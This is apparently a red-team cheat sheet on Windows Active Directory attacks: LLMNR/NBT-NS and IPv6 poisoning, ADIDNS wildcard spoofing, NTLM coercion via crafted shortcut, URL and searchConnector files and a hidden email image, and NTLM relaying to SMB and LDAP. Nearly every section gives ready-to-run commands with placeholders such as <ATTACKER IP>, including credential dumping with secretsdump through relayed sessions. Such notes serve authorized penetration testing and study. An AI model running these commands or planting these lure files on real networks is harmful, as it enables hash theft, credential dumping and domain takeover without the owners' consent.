# Relaying & Poisoning
* [Poisoning](#Poisoning)
  * [LLMNR & NBT-NS](#LLMNR-&-NBT-NS)
    * [Responder](#Responder)
    * [Inveigh](#Inveigh)
  * [Active Directory-Integrated DNS (ADIDNS)](#Active-Directory-Integrated-DNS)
  * [IPv6](#Mitm6)
  * [Files](#Files)
* [Coercing](#Coercing)
* [Relaying](#Relaying)
  * [SMB relaying](#SMB-relaying)
  * [LDAP(S) Relaying](#LDAP-Relaying)

- Credits to an amazing post: https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/

## Poisoning
- Poisoning is possible with Responder or Inveigh or manually, which will try to poison Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).

## LLMNR & NBT-NS
### Responder
#### Analyse mode
- It is possible to check if LLMNR and NBT-NS is used without poisoning any request.
```
sudo responder -I eth0 -A
```

#### Poison Requests
- Poison Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS) requests.
```
sudo responder -I eth0
```

### Inveigh
- https://github.com/Kevin-Robertson/Inveigh
- Can poison LLMNR and NBTNS, but also ADIDNS
- Use `-ConsoleOutput Y` to enable ConsoleOutput

#### Analyse mode
```
Invoke-Inveigh -Inspect
```

#### Run inveigh
```
Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```

#### Get data from hashtable
```
Get-Inveigh - get data from the $inveigh hashtable
```

#### Get all captured NTLMv2 challenge/response hashes
```
Get-Inveigh -NTLMv2
```

#### Stop
```
Stop-Inveigh
```

#### Enable real time console output
```
Watch-Inveigh
```

#### Clear hashtable
```
Clear-Inveigh
```

#### Get-Inveigh
```
Get-Inveigh
```

### Active Directory-Integrated DNS
- ADIDNS
- Windows uses DNS, LLMNR and then NBNS in the respective order
- If a matching DNS record name does not already exist in a zone, an authenticated user can create the record.
- If you detectthe same LLMNR/NBNS request from multiple systems, a matching record can be added to ADIDNS. This can be effective when systems are sending out LLMNR/NBNS requests for old hosts that are no longer in DNS. If multiple systems within a subnet are trying to resolve specific names, outside systems may also be trying. In that scenario, injecting into ADIDNS will help extend the attack past the subnet boundary.
- https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/
- https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing
- https://github.com/Kevin-Robertson/Powermad

#### Check WINS forward lookup
- If WINS forward lookup is enabled then adding a wildcard record won't work.
- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
- The entry type `65281` (i.e. `WINS`) will exist if WINS forward lookup is enabled.
```
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' <DC IP>

dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' <DC IP> | grep "WINS\|65281"
```

#### Check ADIDNS permissions
- By default `authenticated users` have the `CreateChild` permissions.
```
Get-ADIDNSPermission

Get-ADIDNSPermission | Where-Object -Property IdentityReference -EQ S-1-5-11 | Where-Object -Property ActiveDirectoryRights -EQ CreateChild
```

#### Check for wildcard record
- The DNS server will use the wildcard record to answer name requests that do not explicitly match records contained in the zone.
- Gives error if it doesn't exist.
```
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord

Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition System
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition ForestDNSZones
```

```
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action 'query' <DC IP>
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action 'query' <DC IP> --legacy
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action 'query' <DC IP> --forest
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action 'query' <DC IP> --partition
```

#### Create wildcard record
- By default, replication between sites can take up to three hours.
- Use `-Tombstone` so any authenticated user can perform node modifications
```
New-ADIDNSNode -Node * -Data <ATTACKER IP> -Verbose

New-ADIDNSNode -Node * -Data <ATTACKER IP> -Verbose -Tombstone
```

```
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action add --data <ATTACKER IP> <DC IP>
```

#### Give other groups permissions to the record
- Optional
```
Grant-ADIDNSPermission -Node * -Principal "Authenticated Users" -Access GenericAll -Verbose
```

#### Enable tombstoned record
```
Enable-ADIDNSNode -Node *
```

#### Tombstone record
```
Disable-ADIDNSNode -Node *
```

#### Cleanup record
```
Remove-ADIDNSNode -Node *
```

```
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action remove --data <ATTACKER IP> <DC IP>
```

#### Check DNS
```
nslookup idontexist.<DOMAIN>
Resolve-DnsName idontexist.<DOMAIN>
```

### Inveigh
- Inveigh can dynically spoof this too
- `combo` Add a record to DNS if the same request is received with LLMNR/NBNS from multiple systems
- `ns` injects an NS record and if needed, a target record. This is primarily for the GQBL bypass for wpad.
- `wildcard` injects a wildcard record
```
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```

### Mitm6
- https://github.com/dirkjanm/mitm6
- In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.
- However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.
- Spoof any requests for internal resources
```
sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
```

### Files
- It is possible to force authentication if a user opens a file location in explorer or files itself.
- Will authenticate to our attacking machine as the user
- Tools that can create these files:
  - https://github.com/mdsecactivebreach/Farmer - Windows
  - https://github.com/Greenwolf/ntlm_theft - Python

#### Link file
- Explorer automaticly connects if folder where the SearchConnector is, is opened.
- On Windows right click --> New --> Shortcut --> and in the URL use
- Creates a ```[SMB] NTLMv2-SSP Hash``` in responder, ```[*] SMBD-Thread-4:``` in ntlmrelayx. Can be used against relaying to SMB.
```
file://<IP>/test
```

#### URL file
- Explorer automaticly connects if folder where the SearchConnector is, is opened.
- Filename ```something.url```
- Creates a ```[SMB] NTLMv2-SSP Hash``` in responder, ```[*] SMBD-Thread-x:``` in ntlmrelayx. Can be used against relaying to SMB.
```
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\<IP>\%USERNAME%.icon
IconIndex=1
```

#### SearchConnector
- Explorer automaticly connects if folder where the SearchConnector is, is opened.
- Actives the Windows Webclient service which can be used to authenticate a host again to the attacking IP with petitpotam.
- Creates a ```[WebDAV] NTLMv2 Hash``` in responder, ```HTTPD: received``` in ntlmrelayx. Can be used against relaying to ldap, ldaps and SMB
- https://www.bussink.net/webclient_activation/
- Filename ```Documents.searchConnector-ms```
```
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>//<ATTACKER IP>@80/test.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>//<ATTACKER IP>@80/test</url>
    </simpleLocation>
</searchConnectorDescription>
```

#### 1x1 image in Emails
```
<img src="\\<IP>\test.ico" height="1" width="1" />
```

#### For other filetypes check out the tools listed

## Coercing
- https://github.com/p0dalirius/Coercer

#### Check which coercer methods are available
```
python3 Coercer.py scan -t <TARGET IP> -u <USER> -p <PASSWORD> -d <DOMAIN>
```

#### Force auth to attacker IP
```
python3 Coercer.py coerse -L <ATTACKER IP> -t <TARGET IP> -u <USER> -p <PASSWORD> -d <DOMAIN>
```

#### WEBDAV auth
- https://github.com/topotam/PetitPotam
- https://github.com/dirkjanm/krbrelayx
- Creates a ```[WebDAV] NTLMv2 Hash``` in responder, ```HTTPD: received``` in ntlmrelayx. Can be used against relaying to ldap, ldaps.
- Will authenticate to our attacking machine as the computer account. Can be used for RBCD.
```
python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@80/a <TARGET>

python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
```

## Relaying
### SMB relaying
- Requirement: Only possible to hosts without SMB Signing

#### Check for SMB hosts without SMB signing
```
crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
```

#### Relay requests SMB and dump SAM
- We have to modify the ```/etc/responder/Responder.conf``` file and disable the HTTP and SMB servers (as NTLM relay will be our SMB and HTTP server).
- the ```-d``` flag has now been changed from “Enable answers for NETBIOS domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False” to “Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False”. It should also be noted that ```-d``` as it is now CAN have an impact on your client’s network, as you are effectively poisoning the WPAD file over DHCP, which does not always revert back immediately once you stop the attack. It will likely require a reboot.
```
ntlmrelayx.py -tf smb_hosts_nosigning.txt -smb2support
```

#### Relay requests SMB and keep SMB sessions open
- Use the ```socks``` option to be able to use the ```socks``` command to get a nice overview of the relayed attempts. It will also keep the SMB connection open indefinitely. 
- The file `smb_hosts_nosigning.txt` should only contain IP's, FQDN doesn't work, see [issue](https://github.com/fortra/impacket/issues/642)
```
ntlmrelayx.py -tf smb_hosts_nosigning.txt -socks -smb2support

# Get overview of all relay attempts
ntlmrelayx> socks

# Change socks proxy
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080

# Use proxychains and it will ignore the password value and use the relay credential instead
proxychains python3 secretsdump.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>

# Also possible to access shares on the network, for example if user is not local admin
proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
```

## LDAP Relaying
- Requires LDAP signing or LDAPS Binding to be turned off (default).

#### Check LDAP Signing or Binding
- https://github.com/zyn3rgy/LdapRelayScan
```
python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>

cme ldap <DC IP> -u <USER> -p <PASSWORD> -M ldap-checker
```

### Resource Based Constraind Delegation attacks
- [Webclient Attack](Domain-Privilege-Escalation.md#Webclient-Attack)
- [Change-Lockscreen](Domain-Privilege-Escalation.md#Change-Lockscreen)


